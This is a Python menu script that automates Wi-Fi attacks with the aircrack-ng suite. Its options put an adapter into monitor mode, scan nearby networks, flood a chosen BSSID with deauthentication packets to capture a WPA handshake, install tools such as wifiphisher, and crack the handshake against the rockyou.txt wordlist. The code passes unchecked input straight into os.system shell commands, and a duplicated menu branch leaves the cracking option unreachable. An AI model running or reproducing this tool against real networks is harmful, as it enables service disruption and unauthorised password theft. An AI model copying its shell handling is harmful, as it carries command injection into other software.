import os
import time
from functions import banner

enter = "\n"

def menu():
    os.system("clear")

    print("""{0}
                *** The Script was Created By Idan Malihi ***{1}""".format(banner(), enter))

    print("""Menu:
    (1) Enable Monitor Mode
    (2) Disable Monitor Mode
    (3) Scan Networks
    (4) Getting Handshake
    (5) Update & Upgrade Machine
    (6) Install wireless tools (Type 5 before)
    (7) Crack Wi-Fi with rockyou.txt
    (8) About the Hacker
    (9) Exit""")

    option = int(input("{0}Choice > ".format(enter)))

    if option == 9:
        exit()

    elif option == 8:
        print("""
Hi, my name is Idan (TraiLeR) and I am an Ethical Hacker, Bug Bounty Hunter and Cyber Security Researcher.
Since I was a child I loved challenges and do things that would open my mind and be more creative.
Feel free to reach me on LinkedIn:
https://www.linkedin.com/in/idan-malihi-b993611aa/

OR

Feel free to reach me on Telegram:
@TraiLeR30
        """)

    elif option == 1:
        print("Set up the adapter{0}".format(enter))
        adapter = input("Enter your adapter's name > ")
        os.system("ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up && airmon-ng check kill".format(adapter))
        menu()

    elif option == 2:
        adapter = input("Enter your adapter's name > ")
        os.system("airmon-ng stop {0} && service network-manager restart".format(adapter))
        menu()

    elif option == 3:
        adapter = input("Enter your adapter's name > ")
        scan = "airodump-ng {0} -M".format(adapter)
        print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")
        time.sleep(5)
        os.system(scan)
        time.sleep(5)
        menu()

    elif option == 4:
        adapter = input("Enter your adapter's name > ")
        scan = "airodump-ng {0} -M".format(adapter)
        print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")
        time.sleep(5)
        os.system(scan)
        bssid = str(input("\nEnter Target's BSSID > "))
        channel = int(input("\nEnter Network's Channel > "))
        path = str(input("\nEnter Network's Channel > "))
        packet = int(input("Enter the number of packets > "))
        attack = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(adapter,bssid,channel,path,packet,bssid,adapter)
        os.system(attack)
        menu()

    elif option == 5:
        os.system("sudo apt-get update && sudo apt-get full-upgrade -y")
        menu()

    elif option == 6:
        os.system("clear")
        print("""
1) Aircrack-ng
2) Wifite
3) Kismet
4) Wifiphisher
5) inSSIDer
6) Wireshark
7) Airgeddon
8) Wifi Honey
9) Install ALL
            """)

        tool = int(input("Enter the number of the tool > "))

        try:
            if tool == 1:
                os.system("sudo apt-get update && sudo apt-get install aircrack-ng -y")

            elif tool == 2:
                os.system("sudo apt-get update && sudo apt-get install wifite -y")

            elif tool == 3:
                os.system("sudo apt-get update && sudo apt-get install kismet -y")

            elif tool == 4:
                os.system("sudo apt-get update && sudo apt-get install wifiphisher -y")

            elif tool == 5:
                os.system("sudo apt-get update && sudo apt-get install linssid -y")

            elif tool == 6:
                os.system("sudo apt-get update && sudo apt-get install wireshark -y")

            elif tool == 7:
                os.system("sudo apt-get update && sudo apt-get install airgeddon -y")

            elif tool == 8:
                os.system("sudo apt-get update && sudo apt-get install wifitap")

            elif tool == 9:
                os.system("sudo apt-get update && sudo apt-get install -y aircrack-ng wifite kismet wifiphisher linssid wireshark airgeddon wifitap")

        except:
            print("You did not type the right number on the list!")

    elif option == 6:
        if os.path.exists("/usr/share/wordlists/rockyou.txt"):
            handshake = str(input("Enter the path of the handshake file > "))
            print("{0}To exit Press CTRL +C".format(enter))
            os.system("aircrack-ng {0} -w /usr/share/wordlists/rockyou.txt".format(handshake))
            time.sleep(5)
            exit()
        elif not os.path.exists("/usr/share/wordlists/rockyou.txt"):
            os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
            handshake = str(input("Enter the path of the handshake file > "))
            print("{0}To exit Press CTRL +C".format(enter))
            os.system("aircrack-ng {0} -w /usr/share/wordlists/rockyou.txt".format(handshake))
            time.sleep(5)
            exit()

menu()
